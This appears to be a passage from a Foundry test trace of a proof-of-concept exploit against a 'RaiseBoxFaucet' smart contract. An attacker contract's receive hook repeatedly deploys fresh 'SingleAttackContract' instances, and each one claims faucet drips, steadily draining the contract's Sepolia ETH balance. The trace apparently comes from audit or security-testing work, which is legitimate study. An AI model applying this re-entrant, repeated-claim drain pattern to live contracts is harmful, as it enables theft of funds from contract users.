    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 21) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19570974] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19570215] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19534047] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19526389] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 890000000000000000 [8.9e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xF566ede110dc497FE83a0A5c170A744c3606F004
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 22) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19269005] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19268246] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19232078] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19224420] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 885000000000000000 [8.85e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xC53f9DaB9A2c5a1138ce0AE27AeAFDd78c743887
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 23) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18967036] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18966277] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18930109] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18922451] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 880000000000000000 [8.8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x5bf1C50a8f0324dF5f275dca208bA26BA3323293
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 24) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18665067] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18664308] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18628140] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18620482] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 875000000000000000 [8.75e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x126f508bd9CfFfB47d3D399Ca981Fa209138cFc1
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 25) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18363098] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18362339] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18326171] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18318513] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 870000000000000000 [8.7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x9ce49e5bF3AEbe78392E761E8f06B2c823CF4CAd
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 26) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18061129] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18060370] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18024202] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [18016544] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
